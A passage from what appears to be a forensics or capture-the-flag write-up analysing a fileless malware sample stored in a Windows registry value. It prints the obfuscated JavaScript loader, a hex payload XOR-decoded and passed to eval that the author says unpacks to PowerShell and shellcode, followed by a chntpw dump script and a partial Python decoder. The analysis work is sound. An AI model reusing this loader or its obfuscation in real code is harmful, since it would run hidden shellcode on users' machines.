710c2b1e15033449074d30042e01232304213d4a3a596e1a1411205b1d1d302434790e2b3401033515381a2e543435123d61142d145a3458740773060f0b5c2d1d0e300008295700567e2a33160a091b3e32161e512362260c12040508361d477d3e045f3b3517117912191118167b2926643e3d2a211b10286103002d2f120b0c34281e787b166401027a5c06171f161603100a525d033d1918623f033721001001514e2c1d006730633700135008026d1e24021577073217061138360210321f1c0e08033b6200360a00070d12141a2c796e2d53233652793e0e2e31450a770502665a1a107a6b153600041e257d54551f6c3f1a021e0d1437411f0955163234440563022164672a35562325747f400e0e2200353051070a340f1c253a705311762223616766152d21223d211f5a41634a157f6b18502d150324473e637d65130e3b200744457e0d2c7e1c152f115904362024330c0e1b0c153d012f1657046a5e310f253a07723338165671077003137b71303008563f0d701e486e7114772e797f2a133405157a27752f1c091702062d1a07633a210913212e1d6a09110303101d0f0e0173291b2117520d77550c2f2f19262719330f500a11582819795902311f0f16032e0c7d715e0819086e0c040c3934284a1c7b120d2e020b175c463c7f351b5b1c24672f6726313a1216203702007621173c3434245c1b3d371b34260335011a5c7e306b3c0854533934392a180a2e027458421b0437542d360c0220357554551f6c3f0404280d2c43740022543847341862213a2104241f3529231f122b1a1b212540231054271a2f0410203a705f0d7225147b59190f2b55362f06375e537f3b0228710c203d3e0c385f007c1e2c283f283b333e1c4e353e724317010e5b0b003f24067828030f1e172320090e1b6a3f001423245c0e3e2a3856710c012a195f001c300a27130d03567a7d053a3a2c553b513b440d3c700d752f1c0914043432431a5d28074e101f141853191200082e09552b0729220635000525732d002d2d63270c450d0d5070204407684b7e141008013d0703017877771f16087e36380d472339751065110d003e0b0733462a6126046d354f2c176803281463632c323c1731090c340f3b3b05073e3c3e250f2b1c0e2962792f672c10096a04152d2f32301602797e461a2e2b5c0622083926406155560f00391f2f24342f287307096f24460c2e793e0d31682d2a3a3d2624777b1111312d48202426220a3b701c3021634e275f0f3d686316121f2e3e7518355d507f3e371b5c072b2a152916572d771a04293b503a3f2122080c066d023921467b181b37361e0823081f05040135282c59515f2d550f025c0e3e2a385671077003137b713c2c7a0a0e20053045656e3639156f7e08383f2f156337762a0412141e02224f046038074d2a22394061620e0f323a1d170b1314332d2107120e59592f3e34012e26442715536f0e42050d6e4a1c3a255e22762a0a5259631f0f1c7a1f383707282b0035532d227a1d20132411397a2e0c713137313f73103f3c176f3e305d2e301c22303233347e163d335d3a0e0d1b2d2066762b6b371b5f7c043b0b041915252c770c432c0476521639080726400711617b17393731010a3f1c4e06206e01021b2000240a2e17661235172c0d060522243a220036305419092b3d0420105d010b465411710223481331103506375e5f602f763561183b3623293403056c12391e013f60043149520c11081923651a4a351f202506132c150c11742614090919625e31543a1b00322d3a1e586c135d0e3955092d1b7b3c44082e0241565c353a035419143945021f69310120310d3a5b0a30471c5d28034e283e1b1f7b052b38123e05100a1136702d18222c2f5e260b00240515271e2812676f714b3d0d625c03140f56151c180a65636048220801240223420c286b367a120d18390b62341939520b075c34342f14021f1a2c1605323837183c0c261d34313b055e0556183f2706251c1d6640377d211b576766377c0547162e046201651c147a082e366b1b08195f11500f0333345a12312c28735d0a6f3c1a350f05180121643c292539051c1215120a27595c081e553c0a01351b304a605f110208205c77010d050a3e7520086344542f163a6b18546a2d1c384507720639293833203c4426432300501a143b24430b0e3c3d0d220500022b137c3a145b055101310e08102e0f15072b605c0c7814167b62011b27281c1e2f307e6d6e2a332b55192f002f161d51566632192132053420471c5d28034e2835311f62630e46050072090b013e291c3107173677140b2d05381916205c4b530a305d2f196a45332e3115380700277a776436217d6a7e031d223439600f4404160b3d3c182f00290b39005c2a3c3a3d633a6f3200382c2b2c17210c0c37262b24002224035c182506360e3072792378271b76733e377803330e7307036e471b0b150c0b3035100d3172037d0b142d1f2f242613286b033c0943121f35622b010c1c2e02265f310b0d271d18311b57212f0c061e3f3210243159511d62133d75783f15070f03230f2e5606783b3428750709372e170554297c2f66073f1e37283e185220384f153b1e11031f1b01361a030516180532283b090a017e2f1003211b0b74382a0e56750c561d0351473034010e1e0b111156797e102a026b3806173f23437c27432f180231131d36011774270c093f3521117d193f0e1f2e3c05221e2171020f36052178040b2b2f240b083f01146841335629125f471a003e01390c2a0f7f5d411f0e075f7c2f2300233f7b034c07163d31241802423e40180c753a1e3c2f63263f3b1930312f2c2121080711703805470b2a2c0b67353c000e3479502e7c0d2d5f7d1f1e30292733252b795303222a385f02293d471e314403790032331b0027023b385107326b05111b3e576315252630062a082e1c2c38110c2a0b02211e130b1e242d1a302a465f097903207549201e042e1c2e183546537b302435761c163d3a0c1a5a295d3f32071e0e64281f075e22235f0b3b3f01571c101e3a0e3215081b0e22382f12150b7d24005636001b223a211e047507460317705764231a1113090a0e5b794f0f240270270c031e33157e2c53781b33210e1d2d114277061c5f3f3e314369382f111c1f2c5122153122023e261822631b0029243b050b1e1e1e7c70230029234f571a312e112d3d35017c7c5e120c0c4f282c121f283c5a1353051d2d2f303912113d710813623101313b78366d2f02202c2f2731761c3601262f245800290d1b34210d105b20484f237c2c32537e040e2e2b3c237729624351350b275115322d10093a54556e21222d1b21380e38234e0826701a1f18254736153e3620061b18310b0d271c0c311b57212f0c041c3f3210243159520a48133d75783048071f03230f2e564d7b2b3428750706223a3d0554297c2f22043f1e37283e170b35384f153b1e1149082101361a030a041b2f32283b0905587f3f1003211b042c3a2a0e56750c590e007b47303401010e0b111156797e102816513806173f23417e1d432f180231591d1c011774270c0c2b2521117d193f471c143c05221e213c0225360521780b572915240b083f0e4d7c6b335629125f49193a3e01390c2a0b6867411f0e075025383300233f7b030106163d31241802453f7a180c753a11623963263f3b19307b3b16212108071139383f470b2a2c0b602306000e34795f706b372d5f7d1f1e793f0d33252b795307363a385f0229321a1e3144037900327a0c3a27023b385e15247b05111b3e572615352630062a073f081638110c2a0b00360e130b1e24220f242a465f0979036f6263201e042e1c2e183546537b302437770c163d3a0c15072b673f32071e0e613c1f075e22235f432f3f01571c101e3a180815081b0e227b3912150b7d24001d35001b223a211e006117460317705720361a1113090a01486d650f240270270c032433157e2c53301b09210e1d2d114177061c5f3f3e31447e122f111c1f2c52223f3122023e261b36591b00292434591c0e1e1e7c702c5c3e334f571a312e112e0735017c7c5101191c4f282c1210332b5a1353051d223f243912113d710702610b01313b7839353902202c2f273e2b1c2601262f24575f3e1d1b34210d105a23584f237c2c3d097e040e2e2b3c2c2b3f624351350b275115082d10093a5b0d7a21222d1b21380d39334e08267015450f0f4736153e3667063118310b0d28420e211b57212f03580a3f32102431560d1e62133d75783003072503230f2e59596f11342875070932392d0554297c2f6410151e37283e185436024f153b1e1e5b0b3101361a0305150c1532283b0905157e151003211b0b3f2e3a0e56750c5909176b4730340101441d2b1156797e1f7015513806173f23407d27432f18023e001e36011774270c423d3521117d193f0c0b3e3c05221e2e2c0225360521780b543d15240b083f0e036b51335629125f481a3a3e01390c2a0d6b5d411f0e075f353b3300233f7b0c5d06163d31241802432940180c753a11643973263f3b19307f2c2c2121080711712f3f470b2a2c0438353c000e34795f777f272d5f7d1f1e793c3733252b7953073600385f02293d001e31440379003d20183a27023b385105255105111b3e5760151f2630062a082f081638110c2a0b043634130b1e242d1c262a465f0979036e6163201e042e13770c2546537b30247e7636163d3a0c15063d5d3f32071e0e63281f075e22235f0b390501571c10112b0d1815081b0e227f3b12150b7d240f0e212a1b223a211e056207460317705763341a1113090a01486d4f0f2402702855171e33157e2c537b1b33210e1d2d1140603c1c5f3f3e314669282f111c1f230e20153122023e290a23731b002924341b1c1e1e1e7c70234629194f571a312e112e2d35017c7c51480c0c4f282c121f2f3f4a1353051d223a270312113d710702761b01313b7839333b28202c2f273e2e1c3601262f24575e3d371b34210d105820624f237c2c3d4f6a140e2e2b3c23713f584351350b280c15322d10093a5b0c7a1b222d1b21371f3b194e0826701a1d19254736153e362d042118310b0d271a0c1b1b57212f0c060a153210243159540958133d75783f10062503230f2e564c7b013428750709302d2d0554297c2039073f1e37283e185020284f153b1e11481c2101361a03055b183f32283b09055e6a051003211b0b3f393a0e56750c561c175147303401010c0a2b1156797e1f70027b3806173f23427d0d432f180231581e360117742703503f1f21117d193f461c043c05221e2e2f1535360521780b1d3d3f240b083f0e487f6b335629125f010d2a3e01390c25117f77411f0e075f7c3b3300233f7b0c5c07063d312418020e3e7a180c753a11213863263f3b1930322d3c2121080711363b05470b2a2c043f3606000e34795028681d2d5f7d1f1e792b3733252b79534c362a385f02293d431d0b44037900323d0c3a27023b385106315105111b3e572615252630062a082f1f3c38110c2a0b4a2224130b1e24220f2700465f09790c326263201e042e133e0c2546537b302b25771c163d3a0c15013e773f32071e0e603f25075e222350183b2f01571c101e3a1a1815081b0e22383802150b7d240054353a1b223a211e05622d460317705766371a1113090a0e5c7a650f2402702818172433157e2c537c1809210e1d2d110a74161c5f3f3e3e1b7f022f111c1f2c57362f3122023e261a36591b002924345c1f341e1e7c70234829234f571a31210a391735017c7c514b0d1c4f282c12103d28601353051d223f330312113d710858612101313b7836693838202c2f2731731f1c01262f2457152a1d1b34210d1f0134484f237c2c32517d040e2e2b3c237628624351350b275202222d10093a5b0e6d21222d1b21380e3b194e082670154418254736153e3666062118310b0d28440f1b1b57212f035e1d2f3210243156410948133d7578300e070f03230f2e5643783b3428750706232d2d0554297c2038132f1e37283e185221384f153b1e1e5b082101361a03055b182f32283b09055c7e2f1003211b0b76393a0e56750c565503514730340101471e2b1156797e1f3a01413806173f2c1e6927432f18023e02091c011774270c413c2521117d19301b1f143c05221e2e2c0135360521780b522905240b083f0e4c7c41335629125f041a003e01390c251f7c67411f0e075f353b0900233f7b030612063d31241802012a7a180c753a1e3c2f63263f3b193f222f3c2121080711382c3f470b2a2c0b672206000e34795f3d7f272d5f7d1f1e79280d33252b795c5b3500385f02293d450a21440379003230181027023b385105247b05111b3e576315252630062a073d091638110c2a045a2224130b1e2422452410465f0979032d6259201e042e1c28183546537b302437611c163d3a0c1a5e3d673f32071e0e642b35075e22235f40390501571c10112b0d1815081b0e2d253812150b7d240055223a1b223a21115c753d460317705763231a1113090a01017a4f0f2402702818030e33157e2c537a0f09210e1d2d1144743c1c5f3f3e3e1d7e282f111c1f230f35053122023e261b21591b00292434160b1e1e1e7c7023033d334f571a31210e3a2d35017c7c5e100e364f282c121f293c601353051d223f273912113d710858621b01313b7836212f2b2405210617210c0c37262b2f710b233503390f1d075d1d765f0a720d1b5f7914382e2f3705252c79764f31077f5f04272e23212a7d546e1f653f030706101237551b316b473c3418623d3b1b68201e50392f2228231c1b3a214538302215305e2d1f0b3f010e0b5a00365c7505152b21222a1b3e635864157a366a21372f2e77204306067d0428640525013126402428501c151e3c46082134230d13281a0c1132353b285707522b10033a3e003c13212f595a017717387f093d321a11130f05025a6e61002f150a0951002406337822400237240438342d3c14752c295a24233a035415150f09043c053867100f2d181018215c5c142d2a273a16205c497c420e552f09795f00481f2c162a131c7c580608081c533f2d311b31165e5d4612062d212513241d130b2211751b431b2c676436121630382b2b1472083537362f2f470b2a2c0b6321061c5e3d60572378271b5f7914382e2f3574092f0266471a1b1d572c361739071b72037d0b142d1f2a110217276008207b2001351f71361425132211312e210d160e1124155c7b2524250b1a2f0410203a705f0d72253d727766152b3e3a282625700d7f3b2b2d6d7c0d20130324472858026428383b200721254c3c3c0d422c0e3c46321e383d3425381f0f7413353a2a53045302290b3504142138030979621c6321006f483b237b20441e173c47575d22722d5501513b207d0766230d3837240405330c111f635c294110441b115209164408640152233b14362d35031636675d1d3e34021c093428166b0a165d061d6e5e0e211b0a3d01030966056032212169352c3647373b7510621b027f66242a2f123c7a2d096e271a2312741c212e023c2c2929220c2721241006247a082c370723271104273a58792378271b5f7914382e2f3705252f70047d3171764b2c261c45271f750d57103a04150011023f337808227b33111f35713611310b21280b2e390c02241111312d47231054271a2f0410203a705f0d72253d7173161e03211f230b250153543f1628730c33202e3e3f4a285f3039283b0d600435314d262f7d023921467b181b37361e0823081f0504283f02230b7a2b0c16272a0722121e497a71077003137b7130300a27130d0127567d753924067b1d1500207508693c653d061d635b3257021c722c0c53113e1f117b28191d300420112615143f160c0c1b3b493e173c3f240b08240237725105562d1979571e3a08013d070301787c064f071e5728281936233b70255301160b3120132438335021195b1c1a6632613e3f3f12162c2b2c17210c0c37262b2f7103305522660f7625051b620d1755336f08510048252a1f28370276624f1a700d6c1539104525257d08573160040f311a1f17377f1c336c1d40044466610a31072411350b3e220219312351267708305106372b29010b15734e2566516a62681e1602211033210b085e7f3f37235b22543615003f4a28591a2628152b14061b26510b2c6e27171e3c5c080f27211b0823000c741723140634026934350825162d2a205915445c02735439540024300f122217155301794c3227037b0d030c222807572079310d19210e0754203a5b013a423f1a660579172c2002007e52222c0c21033503003f675957312401151d24021e7a7e307b06346a61333103023f1729167a670332212162390068222b3f70135305163d312318270f3c7a2e005b3a3f253f74102b3f15163b2d18660d0c0c37262b2f710b2e272d342506360e3d60572e52571c0e540f097c22252b252f72755131000e5f06296a390715032f7d0b142d1f2a11023f337b15097f241a35355729151c102000361c18052c0e1108212e0925202a04372b0b182031450100600b147b59161e0025362827215d04790f7304710c203d3e0542782d060e27101e3f380437407226587a0215382c450b0006243413385d0f741f7a15161a056a2435090d140b78504050181a7f3c6e7a1810773b7d3417367a460c144c4106616a3a0f725507486f3863213b2e391e23392a23401c3c772540622a6c06311835383c113f3931203d252907005c303b125d7d5c192b1916465d36420c3f545c791c3103542d271e111053163575542a062e0235501f440464757b7f525d6f0b505a0e1f5b1a5e335f102a257b5b5a410103393520675f7a"</span><span class="p">;</span><span class="w">  </span><span class="nx">DytJP2tQpTFSCSPfCj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"JihKxAnKqmpPHXLXpFwSWS75itMzd9siGw"</span><span class="p">;</span><span class="w">  </span><span class="nx">iVzIlGRpmThwNOCL1KG</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"dMu8EICKrYXXdxwaUrhHqwy9LmQoERde3472KqSopZ2"</span><span class="p">;</span><span class="w">  </span><span class="nx">SmjeHzofw6cwLeOb6BpRB</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"X9S5J2H6uAeyQezWcwzPZrXk2IAWFPgBEU"</span><span class="p">;</span><span class="w">  </span><span class="nx">EzijgiB9PspsjpmUGT</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"qJQTNYhedo17qygIRlh"</span><span class="p">;</span><span class="w">  </span><span class="nx">zWxyXEVqMTD9xOVPl4qJ</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"9in6qk69cxs6u1MWY1vlmOG0LbrDUcoF5J"</span><span class="p">;</span><span class="w">  </span><span class="nx">wQ5kIBdQNgtKKtnlJzFYm5vi</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"3DgKNXDhE2WOHzrFByxwYg4p6fhgkAwmZifaGWuxeJrc"</span><span class="p">;</span><span class="w">  </span><span class="nx">LqMt2n</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">""</span><span class="p">;</span><span class="w">  </span><span class="k">for</span><span class="p">(</span><span class="nx">xQI8nL9yS</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span><span class="w">  </span><span class="nx">xQI8nL9yS</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="nx">Jhp39</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span><span class="w">  </span><span class="nx">xQI8nL9yS</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mf">2</span><span class="p">)</span><span class="nx">LqMt2n</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="nb">String</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">(</span><span class="nb">parseInt</span><span class="p">(</span><span class="nx">Jhp39</span><span class="p">.</span><span class="nx">substr</span><span class="p">(</span><span class="nx">xQI8nL9yS</span><span class="p">,</span><span class="w"> </span><span class="mf">2</span><span class="p">),</span><span class="w"> </span><span class="mf">16</span><span class="p">));</span><span class="w">  </span><span class="nx">kgyPNNw5dwbGQXunNbOgUy</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"bc7XctQByu2UKFdc9YvmwhUB3gPQt72z"</span><span class="p">;</span><span class="w">  </span><span class="nx">pWnyRnFGYxfzvb9NaSF5drQ</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"zrXXlTyHXew4xwhQf5lCndWx5qKO9cTvZDYMg"</span><span class="p">;</span><span class="w">  </span><span class="nx">CjqmG4rtcUjWCNzOLJpK</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"pxr67Avhtw4dC5EZR"</span><span class="p">;</span><span class="w">  </span><span class="nx">sPDSdBAwGI1fFbcYkhESvZCV</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"qEhOFTieJYw92DVqv9eS7JvtWHJTCbvFpV7"</span><span class="p">;</span><span class="w">  </span><span class="nx">OcxKNinMXDsMTZuSH8GpmV</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"N1n1vRv9voSFMJfxHOQmTjoZd41ffvvUkdztWM9ZK0aZt"</span><span class="p">;</span><span class="w">  </span><span class="nx">BfynX5vgv6j</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"3d4HUJViPevp9ok8rvVv0QXvQWKboVFEOvAbl0lgdlSlEwiy18D1dZ80WyIftDBf146xCO8OaZwDr"</span><span class="p">;</span><span class="w">  </span><span class="nx">Wcfvr3KUA7dQj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">""</span><span class="p">;</span><span class="w">  </span><span class="k">for</span><span class="p">(</span><span class="nx">s5tjXZAMqyTE0Zj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">dUHeZSsh9Ein8ehXw</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span><span class="w">  </span><span class="nx">dUHeZSsh9Ein8ehXw</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="nx">LqMt2n</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span><span class="w">  </span><span class="nx">dUHeZSsh9Ein8ehXw</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">      </span><span class="nx">Wcfvr3KUA7dQj</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="nb">String</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">(</span><span class="nx">LqMt2n</span><span class="p">.</span><span class="nx">substr</span><span class="p">(</span><span class="nx">dUHeZSsh9Ein8ehXw</span><span class="p">,</span><span class="w"> </span><span class="mf">1</span><span class="p">).</span><span class="nx">charCodeAt</span><span class="p">()</span><span class="o">^</span><span class="nx">BfynX5vgv6j</span><span class="p">.</span><span class="nx">substr</span><span class="p">(</span><span class="nx">s5tjXZAMqyTE0Zj</span><span class="p">,</span><span class="w"> </span><span class="mf">1</span><span class="p">).</span><span class="nx">charCodeAt</span><span class="p">());</span><span class="w">      </span><span class="nx">s5tjXZAMqyTE0Zj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nx">s5tjXZAMqyTE0Zj</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="nx">BfynX5vgv6j</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mf">1</span><span class="p">)</span><span class="o">?</span><span class="nx">s5tjXZAMqyTE0Zj</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mf">1</span><span class="o">:</span><span class="mf">0</span><span class="p">;</span><span class="w">  </span><span class="p">}</span><span class="w">    </span><span class="nx">debGISAgM8mZoOwhQl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"2THqj1AWcgvTh7aTBDtmQInzbMwQmTrIJbEwLk2wRLA"</span><span class="p">;</span><span class="w">  </span><span class="nx">L9abAniyzg0QJysBiOE</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"2AQosRFzVVVFvWSO5"</span><span class="p">;</span><span class="w">  </span><span class="nx">G6ttaDIFtfXJ2rTTdCnLrm</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"LnTu8pj7qE1o1uk9WOxG2URDId1qYH"</span><span class="p">;</span><span class="w">  </span><span class="nb">eval</span><span class="p">(</span><span class="nx">Wcfvr3KUA7dQj</span><span class="p">);</span><span class="w">  </span><span class="nx">dthS5nzOkjAWsQVGybC</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"lapVyIgMFCDhGBkMY"</span><span class="p">;</span><span class="w">  </span><span class="nx">arTgKaUl7KUYRlKOz3pCA</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"HgahwpeUlnHkCobMdwTbwtjAMDGwI7GFyV9idM4"</span><span class="p">;</span><span class="w">  </span><span class="nx">YBTJGZnZpktBQXq0wdkomLB</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"BGQUvQLCa1GCSSoa5U6x3"</span><span class="p">;</span><span class="w">  </span><span class="nx">zBrSmpYsigYQbtw8fZqzdrel</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"TXvxkwiywWNQtWoZc3fJq2xil7k9Jdkpgo266WuVst"</span><span class="p">;</span><span class="w">  </span><span class="nx">krqHBDMxarB2eoHmxkhm</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"RQxQJFR7RBxKmbh68"</span><span class="p">;</span><span class="w">  </span><span class="nx">WVqaBpTVpt1M9ofdAOPggqR</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"IcYyfpiGXQCm79GAnep3F2"</span><span class="p">;</span>
</code></pre></div>
<p>This dump contains:</p>
<ul>
<li>hex payload var: Jhp39</li>
<li>
<p>XOR key var: BfynX5vgv6j</p>
</li>
<li>
<p>Decode JS -&gt; PowerShell -&gt; Shikata shellcode  -&gt; cmd echo blob</p>
<p>Exact Scripts I Used</p>
<p>dump_orhmkbye.sh</p>
<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env bash</span>
<span class="nx">set</span><span class="w"> </span><span class="o">-</span><span class="nx">euo</span><span class="w"> </span><span class="nx">pipefail</span>

<span class="k">if</span><span class="w"> </span><span class="p">[[</span><span class="w"> </span><span class="nx">$</span><span class="err">#</span><span class="w"> </span><span class="o">-</span><span class="nx">lt</span><span class="w"> </span><span class="mf">2</span><span class="w"> </span><span class="p">]];</span><span class="w"> </span><span class="nx">then</span>
<span class="w">  </span><span class="nx">echo</span><span class="w"> </span><span class="s2">"Usage: $0 &lt;NTUSER.DAT path&gt; &lt;output txt path&gt;"</span><span class="w"> </span><span class="o">&gt;&amp;</span><span class="mf">2</span>
<span class="w">  </span><span class="nx">exit</span><span class="w"> </span><span class="mf">1</span>
<span class="nx">fi</span>

<span class="nx">NTUSER_HIVE</span><span class="o">=</span><span class="s2">"$1"</span>
<span class="nx">OUT_TXT</span><span class="o">=</span><span class="s2">"$2"</span>

<span class="nx">chntpw</span><span class="w"> </span><span class="o">-</span><span class="nx">e</span><span class="w"> </span><span class="s2">"$NTUSER_HIVE"</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="s1">'EOF'</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="s2">"$OUT_TXT"</span>
<span class="nx">cd</span><span class="w"> </span><span class="err">\</span><span class="nx">Software</span><span class="err">\</span><span class="nx">lirs</span>
<span class="nx">cat</span><span class="w"> </span><span class="nx">orhmkbye</span>
<span class="nx">q</span>
<span class="nx">y</span>
<span class="nx">EOF</span>

<span class="nx">echo</span><span class="w"> </span><span class="s2">"Wrote registry dump to: $OUT_TXT"</span>
</code></pre></div>
<p>recover_flag_from_orhmkbye.py </p>
<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
<span class="s2">"""</span>
<span class="s2">Recover the final blob from the decoded registry stage:</span>
<span class="s2">HKCU\\Software\\lirs\\orhmkbye</span>

<span class="s2">Input:</span>
<span class="s2">  - Text dump produced by chntpw "</span><span class="nx">cat</span><span class="w"> </span><span class="nx">orhmkbye</span><span class="s2">"</span>

<span class="s2">Output:</span>
<span class="s2">  - Intermediate decoded artifacts (JS/PS/shellcode)</span>
<span class="s2">  - Recovered command blob from shellcode</span>
<span class="s2">  - Final 32-hex flag</span>
<span class="s2">"""</span>

<span class="kr">from</span><span class="w"> </span><span class="nx">__future__</span><span class="w"> </span><span class="k">import</span><span class="w"> </span><span class="nx">annotations</span>

<span class="k">import</span><span class="w"> </span><span class="nx">argparse</span>
<span class="k">import</span><span class="w"> </span><span class="nx">base64</span>
<span class="k">import</span><span class="w"> </span><span class="nx">hashlib</span>
<span class="k">import</span><span class="w"> </span><span class="nx">re</span>
<span class="kr">from</span><span class="w"> </span><span class="nx">pathlib</span><span class="w"> </span><span class="k">import</span><span class="w"> </span><span class="nx">Path</span>

<span class="nx">def</span><span class="w"> </span><span class="nx">sha256_hex</span><span class="p">(</span><span class="nx">data</span><span class="o">:</span><span class="w"> </span><span class="nx">bytes</span><span class="p">)</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="nx">str</span><span class="o">:</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">hashlib</span><span class="p">.</span><span class="nx">sha256</span><span class="p">(</span><span class="nx">data</span><span class="p">).</span><span class="nx">hexdigest</span><span class="p">()</span>

<span class="nx">def</span><span class="w"> </span><span class="nx">parse_orhmkbye_dump</span><span class="p">(</span><span class="nx">text</span><span class="o">:</span><span class="w"> </span><span class="nx">str</span><span class="p">)</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="nx">tuple</span><span class="p">[</span><span class="nx">str</span><span class="p">,</span><span class="w"> </span><span class="nx">str</span><span class="p">]</span><span class="o">:</span>
<span class="w">    </span><span class="nx">hex_match</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">re</span><span class="p">.</span><span class="nx">search</span><span class="p">(</span><span class="nx">r</span><span class="s1">'Jhp39\s*=\s*"([0-9a-f]+)"'</span><span class="p">,</span><span class="w"> </span><span class="nx">text</span><span class="p">)</span>
<span class="w">    </span><span class="nx">key_match</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">re</span><span class="p">.</span><span class="nx">search</span><span class="p">(</span><span class="nx">r</span><span class="s1">'BfynX5vgv6j\s*=\s*"([^"]+)"'</span><span class="p">,</span><span class="w"> </span><span class="nx">text</span><span class="p">)</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="nx">not</span><span class="w"> </span><span class="nx">hex_match</span><span class="w"> </span><span class="nx">or</span><span class="w"> </span><span class="nx">not</span><span class="w"> </span><span class="nx">key_match</span><span class="o">:</span>
<span class="w">        </span><span class="nx">raise</span><span class="w"> </span><span class="nx">ValueError</span><span class="p">(</span><span class="s2">"Could not find Jhp39/BfynX5vgv6j in dump file."</span><span class="p">)</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">hex_match</span><span class="p">.</span><span class="nx">group</span><span class="p">(</span><span class="mf">1</span><span class="p">),</span><span class="w"> </span><span class="nx">key_match</span><span class="p">.</span><span class="nx">group</span><span class="p">(</span><span class="mf">1</span><span class="p">)</span>

<span class="nx">def</span><span class="w"> </span><span class="nx">decode_js</span><span class="p">(</span><span class="nx">hex_payload</span><span class="o">:</span><span class="w"> </span><span class="nx">str</span><span class="p">,</span><span class="w"> </span><span class="nx">key</span><span class="o">:</span><span class="w"> </span><span class="nx">str</span><span class="p">)</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="nx">bytes</span><span class="o">:</span>
<span class="w">    </span><span class="nx">raw</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">bytes</span><span class="p">.</span><span class="nx">fromhex</span><span class="p">(</span><span class="nx">hex_payload</span><span class="p">)</span>
<span class="w">    </span><span class="nx">key_b</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">key</span><span class="p">.</span><span class="nx">encode</span><span class="p">(</span><span class="s2">"ascii"</span><span class="p">)</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">bytes</span><span class="p">(</span><span class="nx">b</span><span class="w"> </span><span class="o">^</span><span class="w"> </span><span class="nx">key_b</span><span class="p">[</span><span class="nx">i</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="nx">len</span><span class="p">(</span><span class="nx">key_b</span><span class="p">)]</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nx">i</span><span class="p">,</span><span class="w"> </span><span class="nx">b</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="nx">enumerate</span><span class="p">(</span><span class="nx">raw</span><span class="p">))</span>

<span class="nx">def</span><span class="w"> </span><span class="nx">extract_ps_from_js</span><span class="p">(</span><span class="nx">js_blob</span><span class="o">:</span><span class="w"> </span><span class="nx">bytes</span><span class="p">)</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="nx">bytes</span><span class="o">:</span>
<span class="w">    </span><span class="nx">m</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">re</span><span class="p">.</span><span class="nx">search</span><span class="p">(</span><span class="nx">rb</span><span class="s2">"FromBase64String\('([^']+)'\)"</span><span class="p">,</span><span class="w"> </span><span class="nx">js_blob</span><span class="p">)</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="nx">not</span><span class="w"> </span><span class="nx">m</span><span class="o">:</span>
<span class="w">        </span><span class="nx">raise</span><span class="w"> </span><span class="nx">ValueError</span><span class="p">(</span><span class="s2">"Could not locate FromBase64String('...') in decoded JS."</span><span class="p">)</span>
